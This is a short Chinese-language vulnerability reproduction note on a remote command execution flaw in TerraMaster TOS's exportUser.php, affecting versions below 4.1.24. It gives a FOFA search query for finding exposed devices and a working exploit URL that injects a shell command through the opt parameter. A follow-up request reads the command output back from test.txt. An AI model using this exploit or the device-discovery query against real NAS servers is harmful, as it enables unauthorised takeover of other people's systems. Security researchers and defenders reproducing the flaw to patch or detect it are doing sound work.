# TerraMaster TOS exportUser.php 远程命令执行

# 一、漏洞简介
TerramasterTOS是中国深圳市图美电子技术（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。TerramasterTOS系统 exportUser.php 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

# 二、影响版本
+ TerraMaster TOS < 4.1.24

# 三、资产测绘
+ fofa`"TerraMaster" && header="TOS"`
+ 特征

![1707230386875-617c7117-0c8e-4228-971d-4e0b14395464.png](./img/uG6FSbneaAIz9Qah/1707230386875-617c7117-0c8e-4228-971d-4e0b14395464-909380.png)

# 四、漏洞复现
```plain
/include/exportUser.php?type=3&cla=application&func=_exec&opt=(whoami)>test.txt
```

![1707230462067-53cbb3cb-0e94-4ff3-8ba3-4e7d3eed053a.png](./img/uG6FSbneaAIz9Qah/1707230462067-53cbb3cb-0e94-4ff3-8ba3-4e7d3eed053a-148007.png)

获取命令执行结果

```plain
/include/test.txt
```

![1707230499837-b1a050ef-95af-4d15-bb97-28d5b9c755d3.png](./img/uG6FSbneaAIz9Qah/1707230499837-b1a050ef-95af-4d15-bb97-28d5b9c755d3-148022.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/atopoc3573ymfsnt>